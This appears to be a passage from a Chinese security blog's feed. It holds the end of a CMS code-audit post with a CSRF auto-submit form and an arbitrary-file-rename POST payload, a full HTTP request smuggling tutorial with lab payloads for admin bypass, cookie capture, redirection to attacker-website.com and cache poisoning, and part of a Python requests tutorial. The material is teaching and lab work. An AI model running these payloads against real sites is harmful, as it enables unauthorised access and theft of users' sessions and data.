class="string">&quot;status&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;bio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test555&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.csrf.submit();</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用户访问 <code>test.html</code>，就会立即生成test555的超级用户</p><h3 id="任意文件修改漏洞">任意文件修改漏洞</h3><h4 id="位置-6">位置</h4><p><code>/dapur/apps/app_config/sys_config.php</code> 第190-193行</p><h4 id="分析-6">分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$new_folder</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;folder_new&#x27;</span>];</span><br><span class="line"><span class="variable">$old_folder</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;folder_old&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$old_folder</span> != <span class="variable">$new_folder</span>) &#123;</span><br><span class="line"><span class="variable">$ok</span> = @rename(<span class="string">&quot;../<span class="subst">$old_folder</span>&quot;</span>,<span class="string">&quot;../<span class="subst">$new_folder</span>&quot;</span>);</span><br></pre></td></tr></table></figure><p>对POST传递的参数<code>$folder_new</code>和<code>$folder_old</code>未进行过滤拼接至@rename函数进行文件名修改操作</p><h4 id="复现-6">复现</h4><p>payload如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;dapur&#x2F;?app&#x3D;config HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Content-Length: 147</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;cms.cn</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;?app&#x3D;config</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;6st43dvq664h8i9es4mlfevdi3</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">folder_new&#x3D;config.txt&amp;folder_old&#x3D;config.php&amp;config_save&#x3D;1&amp;site_name&#x3D;1&amp;site_title&#x3D;1&amp;site_url&#x3D;1&amp;site_status&#x3D;1&amp;site_title&#x3D;1&amp;file_allowed&#x3D;1&amp;file_size&#x3D;1</span><br></pre></td></tr></table></figure><p>将网站根目录config.php文件修改成config.txt文件，然后直接访问该文件即可查看</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;全局分析&quot;&gt;全局分析&lt;/h2&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2&gt;
&lt;h3 id=&quot;任意文件删除&quot;&gt;任意文件删除&lt;/h3&gt;
&lt;h4 id=&quot;位置&quot;&gt;位置&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;/dapur/apps/app_config/controller/b
      
    
    </summary>
    
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>HTTP请求走私</title>
    <link href="http://yoursite.com/2020/07/29/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <id>http://yoursite.com/2020/07/29/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
    <published>2020-07-29T15:30:21.000Z</published>
    <updated>2020-07-29T15:30:21.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="产生原因">产生原因</h1><p><strong>原因</strong>:当网站使用两个服务器（一个前端，一个后端）来处理用户所提交的数据，而两个服务器之间对HTTP header的处理不一致，就可能产生HTTP走私问题。</p><blockquote><p>现在的Web应用程序经常在用户和最终的应用程序之间使用HTTP服务器链。用户将请求发送到前端服务器（有时称为负载平衡器或反向代理，也可能是WAF），并且该服务器将请求转发到一个或多个后端服务器。</p></blockquote><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721194357.png" alt=""></p><h1 id="前置知识">前置知识</h1><h2 id="HTTP-1-1的特性">HTTP/1.1的特性</h2><h3 id="Keep-Alive">Keep-Alive</h3><p>Keep-Alive（又称持久连接），在<code>HTTP/1.1</code>中，默认使用启用Keep-Alive，Keep-Alive功能使客户端到服务器端的连接持续有效，同一对客户/服务器之间的后续请求和响应可以通过这个连接发送。</p><h3 id="支持pipeline">支持pipeline</h3><p><code>HTTP/1.1</code>允许在持久连接上可选地使用请求管道（意味pipeline是依赖于持久连接的，而不是独立的）。pipeline请求管道可以在响应到达之前，将多条请求放入队列，但对于pipeline的请求顺序和响应顺序是相对应的。</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721172714.png" alt=""></p><h2 id="对于Keep-Alive模式，如何判断请求所得到的响应数据已经接收完成">对于Keep-Alive模式，如何判断请求所得到的响应数据已经接收完成</h2><h3 id="font-color-red-Conent-Length-font"><font color="red">Conent-Length</font></h3><p>Conent-Length表示实体内容长度，当客户端向服务器请求一个静态页面或者一张图片时，服务器可以很清楚的知道内容大小，然后通过Content-length消息首部字段告诉客户端 需要接收多少数据。</p><h3 id="font-color-red-Transfer-Encoding-font"><font color="red">Transfer-Encoding</font></h3><p>分块编码，数据分解成一系列数据块，并以一个或多个块发送，这样服务器可以发送数据而不需要预先知道发送内容的总大小。</p><h2 id="分块编码（Transfer-Encoding-chunked）">分块编码（Transfer-Encoding: chunked）</h2><ol><li>在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。</li><li>每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF(\r\n)，也不包括分块数据结尾的 CRLF(\r\n)。</li><li>最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</li></ol><p>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25\r\n</span><br><span class="line">This is the data in the first chunk\r\n</span><br><span class="line"></span><br><span class="line">1C\r\n</span><br><span class="line">and this is the second one\r\n</span><br><span class="line"></span><br><span class="line">3\r\n</span><br><span class="line">con\r\n</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><h1 id="几种走私类型">几种走私类型</h1><h2 id="CL-TE">CL-TE</h2><p>前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。</p><p>发送两次请求，当第二次请求时出现HTTP方式错误，则存在走私问题。实验截图：</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721184545.png" alt=""></p><p>原因就是第一次前端服务器解析时，使用Content-Length头判断结束，所以传给后端服务器的数据为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure><p>总共加起来为6，而后端服务器以 Transfer-Encoding: chunked 判断结束，当遇到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>在分块传输中，则代表结束，而后面的 <code>G</code> ，服务器判断未完成的请求，将遗留在缓存中，所以当第二次请求时，接在了 <code>G</code> 的后面，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acc71fe81ee21769802d39f600790089.web-security-academy.net</span><br><span class="line">Connection: close</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这就完成了一次成功的请求走私<br>在实际情况中是不会出现HTTP请求方式错误的，可以通过<strong>时间延迟</strong>来判断是否存在CL-TE类型的走私问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">A</span><br><span class="line">X</span><br></pre></td></tr></table></figure><p>如果存在走私问题，下一个请求就会有明显的延迟。</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721193923.png" alt=""></p><p>或者使用下面的payload进行验证，如果存在走私问题，则会<strong>返回错误</strong>的页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721193726.png" alt=""></p><ul><li>注意<br>由于前端服务器处理Content-Length，需要把我们所有的内容都发送到后端服务器中去，那这个Content-Length可以用Brupsuite自动计算。</li></ul><h2 id="TE-CL">TE-CL</h2><p>前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</p><p>简单判断payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">G</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>时间延迟payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 6</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure><p>响应差异payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">34</span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">a&#x3D;BADHGSGSG</span><br><span class="line">0</span><br></pre></td></tr></table></figure><ul><li>注意<br>需要注意的是走私的请求中，Content-Length一定要少于后面请求中的长度，否则后台会Timeout出现错误。</li></ul><h2 id="TE-TE">TE-TE</h2><p>前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过以某种方式混淆标头来诱导其中一台服务器不对其进行处理。</p><p>混淆的方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><p>简单判断payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac261f3a1eb0e24580730eed00d70071.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721203309.png" alt=""></p><h1 id="利用HTTP请求走私漏洞">利用HTTP请求走私漏洞</h1><h2 id="Bypass前端服务器安全验证">Bypass前端服务器安全验证</h2><p><strong>场景</strong>：前端服务器对某些页面添加了访问限制，比如实验中对admin页面控制在只能是后端服务器才能访问，此时可以通过HTTP走私漏洞来绕过这个限制。</p><ul><li>CL-TE</li></ul><p>实验地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p><p>发送两次请求，响应消息反馈不允许重复header</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721213930.png" alt=""></p><p>于是，加个传输字符数限制，将走私后面的请求去掉，即可访问/admin界面了</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721221139.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721221407.png" alt=""></p><p>完成删除用户</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721221816.png" alt=""></p><ul><li>TE-CL</li></ul><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721223313.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721223504.png" alt=""></p><h2 id="获取前端服务器对请求的重写情况">获取前端服务器对请求的重写情况</h2><p><strong>场景</strong>：前端服务器通常在请求添加到其他请求头之前，先对请求进行一些重写，然后再转发给后端服务器。一般是添加一些HTTP HEADER。可以通过HTTP走私请求来获取到这些重写内容。</p><p>但走私的前提需具备一些条件：</p><ul><li>存在一个POST请求，传入参数会储存并可以被查看</li><li>存在HTTP走私请求</li></ul><p>构造一个chunk，包含一个完整的post请求，把可以储存的参数放在最后。当第二个请求传递时，则会把HTTP HEADER添加在参数后面而被存储。就可以获取到前端服务器所添加的HTTP HEADER。这里需要注意Content-Length不能超过所传递数据包的长度，不然会导致请求失败</p><p>尝试走私请求直接访问/admin，却返回响应信息只有管理员登陆或者从127.0.0.1请求才可以访问</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724145918.png" alt=""></p><p>页面上有个搜索框，输入任意内容，会在页面上返回出来</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724150746.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724150855.png" alt=""></p><p>于是利用这个搜索参数，将前端服务器重写请求的情况展示出来，发现了 X-trnzSu-Ip 请求头</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724151412.png" alt=""></p><p>于是加入走私的请求，再尝试访问/admin发现成功</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724151656.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724152230.png" alt=""></p><h2 id="获取其他用户的cookie">获取其他用户的cookie</h2><p>参考上一个实验，这个实验也是通过获取HTTP HEADER来获取其他用户的Cookie。</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724164032.png" alt=""></p><h2 id="HTTP-header导致的XSS">HTTP header导致的XSS</h2><p><strong>场景</strong>：通常情况下，HTTP HEADER导致的XSS是不好利用的，但是通过HTTP走私请求，我们能够控制HTTP HEADER，进而就可以利用这类HTTP头导致的XSS。</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724164602.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724164644.png" alt=""></p><h2 id="将重定向转变为任意重定向">将重定向转变为任意重定向</h2><p><strong>场景</strong>：许多应用程序执行现场重定向，并将主机名从请求的Host标头放入重定向URL。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;normal-website.com&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure><p>通常，此行为被认为是无害的，但是可以在走私请求攻击中利用它来将其他用户重定向到外部域。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 54</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure><p>走私的请求将触发重定向到攻击者的网站，这将影响后端服务器处理的下一个用户的请求。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: XGET &#x2F;scripts&#x2F;include.js HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;attacker-website.com&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure><h2 id="缓存投毒">缓存投毒</h2><ul><li>构造一个页面中写入恶意的内容，比如写入alert(document.cookie)</li><li>发送请求走私的内容</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post&#x2F;next?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">Host: anything</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br></pre></td></tr></table></figure><ul><li>再寻找到一个可用缓存的js页面（可用导致xss的js）访问。页面会跳转到恶意页面中，并且将恶意内容缓存到服务器上。</li><li>打开主页 ⇒ 导致xss</li></ul><h2 id="缓存欺骗">缓存欺骗</h2><p>缓存欺骗：在Web缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索此内容。</p><ul><li>寻找一个存在隐私的页面，比如这里的my-account，并且页面返回的内容是可以被缓存的</li><li>发送一个走私请求，下一个请求静态资源的请求会跳转到my-acount并把隐私信息缓存</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 42</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;my-account HTTP&#x2F;1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure><ul><li>打开隐私浏览器加载主页，用Brupsuite搜索隐私内容的关键字。如果成功的话可以在静态资源中搜索到</li></ul><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724173247.png" alt=""></p><p>原理是走私的请求把下一个请求HTTP方法那一行注释，请求会变为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;private&#x2F;messages HTTP&#x2F;1.1</span><br><span class="line">Foo: XGET &#x2F;static&#x2F;some-image.png HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: sessionId&#x3D;q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;产生原因&quot;&gt;产生原因&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;原因&lt;/strong&gt;:当网站使用两个服务器（一个前端，一个后端）来处理用户所提交的数据，而两个服务器之间对HTTP header的处理不一致，就可能产生HTTP走私问题。&lt;/p&gt;
&lt;blockquote&gt;
&lt;
      
    
    </summary>
    
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="技巧" scheme="http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>request库使用</title>
    <link href="http://yoursite.com/2020/07/17/requests%E5%BA%93/"/>
    <id>http://yoursite.com/2020/07/17/requests%E5%BA%93/</id>
    <published>2020-07-17T06:30:12.000Z</published>
    <updated>2020-07-17T06:30:12.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="构造请求">构造请求</h2><h3 id="请求头">请求头</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headers=&#123;<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/vnd.github.v3.text-match+json&#x27;</span>&#125;</span><br><span class="line">res = requests.get(url,headers)</span><br></pre></td></tr></table></figure><h3 id="get请求">get请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">res = requests.get(url=<span class="string">&#x27;https://api.github.com/search/repositories&#x27;</span>)</span><br><span class="line">参数</span><br><span class="line"><span class="comment"># res = requests.get(url,params)</span></span><br><span class="line"><span class="comment"># params=&#123;&#x27;q&#x27;:&#x27;requests+language:python&#x27;&#125;</span></span><br><span class="line"><span class="comment"># params=[(&#x27;q&#x27;, &#x27;requests+language:python&#x27;)]</span></span><br><span class="line"><span class="comment"># params=b&#x27;q=requests+language:python&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="其他请求方法">其他请求方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.post(<span class="string">&#x27;https://httpbin.org/post&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.put(<span class="string">&#x27;https://httpbin.org/put&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.delete(<span class="string">&#x27;https://httpbin.org/delete&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.head(<span class="string">&#x27;https://httpbin.org/get&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.patch(<span class="string">&#x27;https://httpbin.org/patch&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.options(<span class="string">&#x27;https://httpbin.org/get&#x27;</span>)</span><br><span class="line">消息体</span><br><span class="line"><span class="comment">#  data=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;</span></span><br><span class="line"><span class="comment">#  data=[(&#x27;key&#x27;, 